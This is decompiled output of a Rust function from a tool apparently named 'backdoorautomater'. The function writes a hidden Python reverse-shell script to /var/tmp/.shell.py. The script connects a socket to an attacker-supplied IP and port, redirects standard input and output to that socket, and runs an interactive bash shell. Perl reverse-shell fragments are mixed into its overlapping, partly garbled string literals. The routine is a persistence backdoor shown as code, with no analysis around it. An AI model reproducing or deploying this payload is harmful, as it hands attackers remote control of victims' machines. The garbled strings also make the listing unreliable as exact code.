long long backdoorautomater::modifyservice::write_shell_pyfile(struct_0 *a0, struct_0 *a1)
{
    unsigned int v0;  // [bp-0x8c]
    char v1;  // [bp-0x88], Other Possible Types: unsigned long
    unsigned int v2;  // [bp-0x84]
    void* v3;  // [bp-0x80], Other Possible Types: unsigned long long
    int v4;  // [bp-0x78]
    int v5;  // [bp-0x68]
    unsigned long long v6;  // [bp-0x60]
    unsigned long long v7;  // [bp-0x58]
    int v8;  // [bp-0x48]
    unsigned long long v9;  // [bp-0x40]
    unsigned long long v10;  // [bp-0x38]
    int v11;  // [bp-0x30], Other Possible Types: char
    char v12;  // [bp-0x20]
    void* v14;  // r15
    int v15;  // xmm0
    int v16;  // xmm0

    v1.create("/var/tmp/.shell.pyimport socket,subprocess,os;\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\nv_ip='os.dup2(s.fileno(),0);\nos.dup2(s.fileno(),1);\nos.dup2(s.fileno(),2);\nv_shell_path='/usr/bin/bash';\nv_shell_value='-i';\np=subprocess.call([v_shell_path,", 18);
    if (*((int *)&v1))
    {
        v14 = v3;
    }
    else
    {
        v0 = v2;
        v14 = v0.write_all("import socket,subprocess,os;\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\nv_ip='os.dup2(s.fileno(),0);\nos.dup2(s.fileno(),1);\nos.dup2(s.fileno(),2);\nv_shell_path='/usr/bin/bash';\nv_shell_value='-i';\np=subprocess.call([v_shell_path,v_shell_value]);\n;", 29);
        if (!v14)
        {
            v14 = v0.write_all("s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\nv_ip='os.dup2(s.fileno(),0);\nos.dup2(s.fileno(),1);\nos.dup2(s.fileno(),2);\nv_shell_path='/usr/bin/bash';\nv_shell_value='-i';\np=subprocess.call([v_shell_path,v_shell_value]);\n;\n/var/tmp/.shell.pluse Socket", 52);
            if (!v14)
            {
                v15 = *((int128_t *)&(&a1->padding_0)[1]);
                v1 = "v_ip='os.dup2(s.fileno(),0);\nos.dup2(s.fileno(),1);\nos.dup2(s.fileno(),2);\nv_shell_path='/usr/bin/bash';\nv_shell_value='-i';\np=subprocess.call([v_shell_path,v_shell_value]);\n;\n/var/tmp/.shell.pluse Socket;\n$p=socket(S,PF_INET,SOCK_STREAM,getprotobyname('tc";
                v3 = 6;
                v4 = v15;
                alloc::str::join_generic_copy(&v11, &v1, 2, 1, 0);
                v7 = *((long long *)&v12);
                v5 = v11;
                (char)v5.extend_from_slice("';\n));\n$i='kindNoneSomeZeroIpv4Ipv6info", 3);
                v14 = v0.write_all(v6, v7);
                if (!v14)
                {
                    v16 = *((int128_t *)&(&a0->padding_0)[1]);
                    v1 = "s.connect((v_ip,";
                    v3 = 16;
                    v4 = v16;
                    alloc::str::join_generic_copy(&v11, &v1, 2, 1, 0);
                    v10 = *((long long *)&v12);
                    v8 = v11;
                    (char)v8.extend_from_slice("));\n$i='kindNoneSomeZeroIpv4Ipv6info", 4);
                    v14 = v0.write_all(v9, v10);
                    if (!v14)
                    {
                        v14 = v0.write_all("os.dup2(s.fileno(),0);\nos.dup2(s.fileno(),1);\nos.dup2(s.fileno(),2);\nv_shell_path='/usr/bin/bash';\nv_shell_value='-i';\np=subprocess.call([v_shell_path,v_shell_value]);\n;\n/var/tmp/.shell.pluse Socket;\n$p=socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));\n", 23);
                        if (!v14)
                        {
                            v14 = v0.write_all("os.dup2(s.fileno(),1);\nos.dup2(s.fileno(),2);\nv_shell_path='/usr/bin/bash';\nv_shell_value='-i';\np=subprocess.call([v_shell_path,v_shell_value]);\n;\n/var/tmp/.shell.pluse Socket;\n$p=socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));\nif(connect(S,sockaddr_i", 23);
                            if (!v14)
                            {
                                v14 = v0.write_all("os.dup2(s.fileno(),2);\nv_shell_path='/usr/bin/bash';\nv_shell_value='-i';\np=subprocess.call([v_shell_path,v_shell_value]);\n;\n/var/tmp/.shell.pluse Socket;\n$p=socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));\nif(connect(S,sockaddr_in($p,inet_aton($i)))){\n", 23);
                                if (!v14)
                                {
                                    v14 = v0.write_all("v_shell_path='/usr/bin/bash';\nv_shell_value='-i';\np=subprocess.call([v_shell_path,v_shell_value]);\n;\n/var/tmp/.shell.pluse Socket;\n$p=socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));\nif(connect(S,sockaddr_in($p,inet_aton($i)))){\nopen(STDIN,'>&S');\nopen", 30);
                                    if (!v14)
                                    {
                                        v14 = v0.write_all("v_shell_value='-i';\np=subprocess.call([v_shell_path,v_shell_value]);\n;\n/var/tmp/.shell.pluse Socket;\n$p=socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));\nif(connect(S,sockaddr_in($p,inet_aton($i)))){\nopen(STDIN,'>&S');\nopen(STDOUT,'>&S');\nopen(STDERR,'>", 20);
                                        if (!v14)
                                        {
                                            v14 = v0.write_all("p=subprocess.call([v_shell_path,v_shell_value]);\n;\n/var/tmp/.shell.pluse Socket;\n$p=socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));\nif(connect(S,sockaddr_in($p,inet_aton($i)))){\nopen(STDIN,'>&S');\nopen(STDOUT,'>&S');\nopen(STDERR,'>&S');\nexec('/usr/bin", 49);
                                            if (!v14)
                                            {
                                                ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&(char)v8);
                                                ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&(char)v5);
                                                ::0x451f50::core::ptr::drop_in_place<std::fs::File>(v0);
                                                ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(a1);
                                                ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(a0);
                                                return 0;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                    ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&(char)v8);
                }
                ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(&(char)v5);
            }
        }
        ::0x451f50::core::ptr::drop_in_place<std::fs::File>(v0);
    }
    ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(a1);
    ::0x451fa0::core::ptr::drop_in_place<alloc::string::String>(a0);
    return v14;
}
